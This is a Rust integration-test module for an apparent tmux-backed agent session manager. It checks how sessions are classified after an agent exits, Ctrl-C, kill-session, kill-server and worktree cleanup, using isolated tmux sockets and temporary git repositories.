    fn unique_socket() -> String {
        let short = uuid::Uuid::new_v4().simple().to_string();
        format!("pulpo-test-{}", &short[..8])
    }

    /// Build a real `SessionManager`: a real tmux backend bound to `socket`, and a
    /// real `Store` in a fresh tempdir. The tempdir is returned so the caller keeps
    /// it alive for the test's duration.
    async fn real_manager(socket: &str) -> (SessionManager, tempfile::TempDir) {
        let tmpdir = tempfile::tempdir().unwrap();
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend: Arc<dyn Backend> = Arc::new(TmuxBackend::with_socket(socket.to_owned()));
        let manager = SessionManager::new(backend, store, None).with_no_stale_grace();
        (manager, tmpdir)
    }

    /// Run a raw `tmux -L <socket> <args>` invocation directly — for operations the
    /// `Backend` trait doesn't expose (`kill-server`, a raw control-key `send-keys`).
    fn raw_tmux(socket: &str, args: &[&str]) -> std::process::Output {
        StdCommand::new("tmux")
            .arg("-L")
            .arg(socket)
            .args(args)
            .output()
            .expect("tmux should be installed and runnable")
    }

    /// Best-effort teardown of a test's isolated tmux server. Always passes an
    /// explicit `-L <socket>` — this must never be able to reach the default socket.
    fn kill_test_server(socket: &str) {
        let _ = raw_tmux(socket, &["kill-server"]);
    }

    fn make_req(name: &str, workdir: &str, command: &str, worktree: bool) -> CreateSessionRequest {
        CreateSessionRequest {
            name: name.to_owned(),
            workdir: Some(workdir.to_owned()),
            command: Some(command.to_owned()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: worktree.then_some(true),
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        }
    }

    /// Poll `condition` until it returns `true`, up to a generous deadline. Mirrors
    /// `watchdog::tests::wait_for` (see that file for why a fixed sleep isn't safe
    /// under a busy parallel test suite — a starved single-threaded runtime can let
    /// wall-clock time pass without actually polling). Returns `bool` instead of
    /// panicking so call sites can assert with a message that includes the last
    /// observed state.
    async fn wait_for<F, Fut>(deadline_secs: u64, condition: F) -> bool
    where
        F: Fn() -> Fut,
        Fut: std::future::Future<Output = bool>,
    {
        let deadline = tokio::time::Instant::now() + Duration::from_secs(deadline_secs);
        loop {
            if condition().await {
                return true;
            }
            if tokio::time::Instant::now() >= deadline {
                return false;
            }
            tokio::time::sleep(Duration::from_millis(150)).await;
        }
    }

    /// Write a tiny shell script and return `sh <path>` as a session command. A script
    /// file (rather than an inline `sh -c '...'` string) sidesteps nested single-quote
    /// escaping entirely — see the documented `pulpo spawn -- <args>` quoting
    /// limitation in the project memory (trailing-arg joining loses quoting), which
    /// this deliberately avoids by never constructing a quoted inline command.
    fn short_agent_script(dir: &std::path::Path, exit_code: i32) -> String {
        let path = dir.join("agent.sh");
        std::fs::write(&path, format!("exit {exit_code}\n")).unwrap();
        format!("sh {}", path.display())
    }

    async fn wait_for_exit_marker(mgr: &SessionManager, id: &str, deadline_secs: u64) -> bool {
        let data_dir = mgr.store().data_dir().to_owned();
        wait_for(deadline_secs, || {
            let data_dir = data_dir.clone();
            async move { crate::session::utils::has_exit_marker(&data_dir, id) }
        })
        .await
    }

    async fn wait_for_status(
        mgr: &SessionManager,
        id: &str,
        status: SessionStatus,
        deadline_secs: u64,
    ) -> bool {
        wait_for(deadline_secs, || async {
            matches!(mgr.get_session(id).await, Ok(Some(s)) if s.status == status)
        })
        .await
    }

    // -- Cell 3: CI promotion of THE bug (#94) ------------------------------------
    //
    // A short agent exits, writing the `.code` marker; the user then exits the
    // lingering fallback shell (`exit` + Enter). The dead tmux session must classify
    // as Stopped with the agent's real exit code, not Lost — this is the exact
    // regression #94 fixed (previously classified Lost, indistinguishable from a
    // crash).

    #[tokio::test]
    async fn test_cell3_short_agent_exit_then_shell_exit_classifies_stopped_with_exit_code() {
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;
        let script_dir = tempfile::tempdir().unwrap();
        let command = short_agent_script(script_dir.path(), 7);

        let session = mgr
            .create_session(make_req("cell3-exit-code", "/tmp", &command, false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        assert!(
            wait_for_exit_marker(&mgr, &id, 20).await,
            "the wrapper should write the .code exit marker once the short agent exits"
        );

        // The user exits the lingering fallback shell.
        raw_tmux(&socket, &["send-keys", "-t", &backend_id, "exit", "Enter"]);

        let stopped = wait_for_status(&mgr, &id, SessionStatus::Stopped, 20).await;
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            stopped,
            "session should classify to Stopped, got {:?}",
            fetched.status
        );
        assert_eq!(fetched.exit_code, Some(7));

        kill_test_server(&socket);
    }

    // -- Cell 4: Ctrl-C sent to a running agent -----------------------------------
    //
    // `wrap_command` runs the wrapped agent as the foreground child of a
    // *non-interactive* `$SHELL -l -c '...'` invocation (no `-i`, so bash/zsh never
    // enable job control there). Empirically verified against both bash and zsh on
    // this workstation: a `send-keys C-c` delivers SIGINT to the pane's whole
    // foreground process group — since there's no job control, that's the wrapper
    // shell *and* its child together, not just the child — so the wrapper shell dies
    // before it can reach its `ec=$?; echo "$ec" > .code` tail. The entire tmux pane
    // exits immediately, with no exit marker ever written (confirmed by hand: `tmux
    // new-session … "$SHELL -l -c 'sleep 300; echo done > marker'"` followed by
    // `send-keys C-c` leaves no marker file and no tmux session behind).
    //
    // So — contrary to a naive assumption that Ctrl-C only interrupts the agent and
    // leaves the fallback shell to record a graceful exit code — a raw Ctrl-C is, from
    // the daemon's perspective, indistinguishable from an external `kill-session`:
    // both kill the whole pane with no marker, and the session correctly resolves to
    // Lost. This test locks in that real, verified behavior rather than asserting a
    // Stopped-with-exit-code outcome the wrapper cannot actually produce.
    #[tokio::test]
    async fn test_cell4_ctrl_c_kills_whole_pane_classifies_lost() {
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;

        let session = mgr
            .create_session(make_req("cell4-ctrl-c", "/tmp", "sleep 300", false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        let alive = wait_for(10, || async {
            mgr.backend().is_alive(&backend_id).unwrap_or(false)
        })
        .await;
        assert!(alive, "long-running session should be alive before Ctrl-C");

        raw_tmux(&socket, &["send-keys", "-t", &backend_id, "C-c"]);

        let lost = wait_for_status(&mgr, &id, SessionStatus::Lost, 20).await;
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            lost,
            "Ctrl-C kills the whole non-interactive wrapper pane with no exit marker, \
             so the session should classify to Lost, got {:?}",
            fetched.status
        );
        assert_eq!(fetched.exit_code, None);

        kill_test_server(&socket);
    }

    // -- Cell 5: kill-session mid-run ----------------------------------------------
    //
    // tmux is killed directly (not via the agent exiting) while a long-running agent
    // is still running — no exit marker is ever written, so this must resolve to
    // Lost, not Stopped.

    #[tokio::test]
    async fn test_cell5_kill_session_mid_run_classifies_lost() {
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;

        let session = mgr
            .create_session(make_req("cell5-kill-session", "/tmp", "sleep 300", false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        let alive = wait_for(10, || async {
            mgr.backend().is_alive(&backend_id).unwrap_or(false)
        })
        .await;
        assert!(
            alive,
            "long-running session should be alive before the kill"
        );

        raw_tmux(&socket, &["kill-session", "-t", &backend_id]);

        let lost = wait_for_status(&mgr, &id, SessionStatus::Lost, 20).await;
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            lost,
            "session should classify to Lost after kill-session mid-run, got {:?}",
            fetched.status
        );
        assert_eq!(fetched.exit_code, None);

        kill_test_server(&socket);
    }

    // -- Cell 6: kill-server mid-run ------------------------------------------------
    //
    // The whole tmux server (this test's isolated socket) is killed while a
    // long-running agent is still running. Same outcome as Cell 5 but at server
    // granularity — still resolves to Lost.

    #[tokio::test]
    async fn test_cell6_kill_server_mid_run_classifies_lost() {
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;

        let session = mgr
            .create_session(make_req("cell6-kill-server", "/tmp", "sleep 300", false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        let alive = wait_for(10, || async {
            mgr.backend().is_alive(&backend_id).unwrap_or(false)
        })
        .await;
        assert!(
            alive,
            "long-running session should be alive before the kill"
        );

        raw_tmux(&socket, &["kill-server"]);

        let lost = wait_for_status(&mgr, &id, SessionStatus::Lost, 20).await;
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            lost,
            "session should classify to Lost after kill-server mid-run, got {:?}",
            fetched.status
        );
        assert_eq!(fetched.exit_code, None);

        // The server (and its socket) is already gone — nothing left to tear down.
    }

    // -- Cell 9: worktree reclaim end-to-end ---------------------------------------
    //
    // A session spawned with `worktree: true` gets a real git worktree; once the
    // session is dead (short agent exit + shell exit -> Stopped, per Cell 3), a
    // `cleanup_dead_sessions` pass must remove the worktree directory from disk and
    // the exit markers end to end — not just flip DB bookkeeping.

    fn git(repo: &std::path::Path, args: &[&str]) -> std::process::Output {
        StdCommand::new("git")
            .args(args)
            .current_dir(repo)
            .output()
            .expect("git should run")
    }

    fn init_repo(repo: &std::path::Path) {
        std::fs::create_dir_all(repo).unwrap();
        git(repo, &["init", "-q"]);
        git(repo, &["config", "user.email", "qa@pulpo.test"]);
        git(repo, &["config", "user.name", "pulpo-qa"]);
        std::fs::write(repo.join("README.md"), "seed").unwrap();
        git(repo, &["add", "."]);
        git(repo, &["commit", "-q", "-m", "init"]);
    }

    #[tokio::test]
    async fn test_cell9_worktree_reclaimed_end_to_end_after_session_dies() {
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;

        let repo_tmp = tempfile::tempdir().unwrap();
        let repo = repo_tmp.path().join("repo");
        init_repo(&repo);

        let script_dir = tempfile::tempdir().unwrap();
        let command = short_agent_script(script_dir.path(), 0);

        let session = mgr
            .create_session(make_req(
                "cell9-worktree-reclaim",
                repo.to_str().unwrap(),
                &command,
                true,
            ))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");
        let worktree_path = session
            .worktree_path
            .clone()
            .expect("worktree should have been created");
        assert!(
            std::path::Path::new(&worktree_path).exists(),
            "worktree directory should exist right after spawn"
        );

        assert!(
            wait_for_exit_marker(&mgr, &id, 20).await,
            "short agent should exit and write the .code marker"
        );

        raw_tmux(&socket, &["send-keys", "-t", &backend_id, "exit", "Enter"]);

        assert!(
            wait_for_status(&mgr, &id, SessionStatus::Stopped, 20).await,
            "session should be Stopped before cleanup runs"
        );

        let cleanup = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(cleanup.sessions_deleted, 1);
        assert_eq!(cleanup.worktrees_cleaned, 1);
        assert!(
            !std::path::Path::new(&worktree_path).exists(),
            "worktree directory should be removed from disk after cleanup"
        );
        let data_dir = mgr.store().data_dir().to_owned();
        assert!(
            !crate::session::utils::has_exit_marker(&data_dir, &id),
            "exit markers should be removed after cleanup"
        );

        kill_test_server(&socket);
    }

    // -- Part 2 proof: a Ready session's tmux dying resolves to Stopped -----------
    //
    // Reaches Ready by directly setting the DB status once the exit marker is on
    // disk and the fallback shell is genuinely still alive in a real tmux session —
    // the Active->Ready transition itself (driven by the watchdog's marker scrape)
    // is exercised by `watchdog::idle`'s own tests, not re-proven here. This test's
    // job is to prove the *fixed* `check_and_mark_stale`/`resume_lost_sessions`
    // reclassify a dead `Ready` session via its `.code` marker instead of leaving it
    // stuck as `Ready` forever (the #94 follow-up limitation, fixed above).

    #[tokio::test]
    async fn test_ready_death_fix_real_tmux_kill_session_classifies_stopped() {
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;
        let script_dir = tempfile::tempdir().unwrap();
        let command = short_agent_script(script_dir.path(), 3);

        let session = mgr
            .create_session(make_req("ready-death-real-tmux", "/tmp", &command, false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        assert!(
            wait_for_exit_marker(&mgr, &id, 20).await,
            "short agent should exit and write the .code marker"
        );
        assert!(
            mgr.backend().is_alive(&backend_id).unwrap_or(false),
            "the fallback shell should still be alive after the agent exits"
        );

        // Simulate the watchdog having already promoted this session to Ready (the
        // Active->Ready transition itself is exercised by watchdog::idle's tests).
        mgr.store()
            .update_session_status(&id, SessionStatus::Ready)
            .await
            .unwrap();

        raw_tmux(&socket, &["kill-session", "-t", &backend_id]);

        let stopped = wait_for_status(&mgr, &id, SessionStatus::Stopped, 20).await;
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            stopped,
            "a dead Ready session with an exit marker must resolve to Stopped, got {:?}",
            fetched.status
        );
        assert_eq!(fetched.exit_code, Some(3));

        kill_test_server(&socket);
    }

    // -- Cell 10: detach/no-client -------------------------------------------------
    //
    // A real attach/detach round-trip (`script -q /dev/null tmux -L <socket> attach
    // …` then a detach keystroke) was tried and rejected: `spawn_attach` shells out
    // through `script(1)` to fake a PTY, and driving + verifying a clean detach
    // headlessly (no real terminal, no human at the keyboard) turned out to depend on
    // `script`'s own PTY emulation quirks across macOS/Linux and on precise timing
    // between the attach handshake and the detach keystroke — exactly the kind of
    // environment-flakiness this task was told to avoid ("don't ship a flaky test").
    // It also wouldn't prove anything the rest of this module doesn't already cover:
    // detaching a client never touches the backend tmux session at all (tmux keeps
    // running with zero attached clients — that's normal, expected operation, not a
    // lifecycle transition), so the real thing worth proving is the documented
    // *approximation*: a session with no attached client is simply a live session
    // like any other from the watchdog's point of view, and repeated staleness/idle
    // checks against it must be stable — no spurious transition — across several
    // consecutive ticks.
    #[tokio::test]
    async fn test_cell10_no_client_session_stable_across_repeated_checks() {
        let socket = unique_socket();
        let (mgr, _tmp) = real_manager(&socket).await;

        let session = mgr
            .create_session(make_req("cell10-no-client", "/tmp", "sleep 300", false))
            .await
            .unwrap();
        let id = session.id.to_string();
        let backend_id = session
            .backend_session_id
            .clone()
            .expect("backend session id should resolve on create");

        let alive = wait_for(10, || async {
            mgr.backend().is_alive(&backend_id).unwrap_or(false)
        })
        .await;
        assert!(alive, "session should be alive before the no-client checks");

        // No client ever attaches — `create_session` only ever `new-session -d`s
        // (detached). Repeatedly re-run the same staleness sweep `get_session` does
        // on every API call, and confirm the session is never spuriously reclassified
        // while the backend is genuinely still alive and no exit marker exists.
        for _ in 0..3 {
            let fetched = mgr.get_session(&id).await.unwrap().unwrap();
            assert_eq!(
                fetched.status,
                SessionStatus::Active,
                "an unattached-but-alive session must not spuriously transition"
            );
            tokio::time::sleep(Duration::from_millis(300)).await;
        }

        kill_test_server(&socket);
    }
}
